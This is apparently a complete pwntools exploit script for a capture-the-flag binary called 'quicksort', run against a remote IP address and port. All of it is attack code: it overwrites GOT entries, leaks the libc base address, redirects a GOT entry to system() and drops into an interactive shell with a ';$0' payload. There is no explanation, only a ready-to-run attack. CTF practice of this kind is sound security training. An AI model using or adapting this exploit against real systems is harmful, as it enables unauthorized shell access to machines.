from pwn import *
context.arch = 'i386'
libc = ELF("./libc.so.6")

#io = process("./quicksort")
io = remote('34.92.96.238' ,10000)

#gdb.attach(io,'handle SIGALRM nostop noprint\nb *0x8048901\nc')

io.recvuntil("sort?\n")
io.sendline("2")
io.recvuntil(":")

payload1 = "134514710"+'\x00'*0x7
payload1 += p32(2)
payload1 += p32(0)*2
payload1 += p32(0x804a018)

io.sendline(payload1)

payload2 = "134520864"+"x"*0x7
payload2 += p32(2)
payload2 += p32(1)*2
payload2 += p32(0x804a020)

io.sendlineafter(":",payload2)

io.recvuntil("result:\n")
leak = int(io.recvuntil(" ").strip(),10)&0xffffffff
libc_base = leak-libc.sym['alarm']

success("LIBC BASE -> %#x"%libc_base)
#gdb.attach(io,'handle SIGALRM nostop noprint\nb *0x8048901\nc')
io.recvuntil("?\n")
io.sendline("1")

payload3 = "%d"%(-(((~(libc_base+libc.sym['system']))&0x7fffffff)+1))
payload3 += ";$0"*2
payload3 += p32(1)
payload3 += p32(0)*2
payload3 += p32(0x804a038)

io.sendlineafter(":",payload3)

io.interactive()
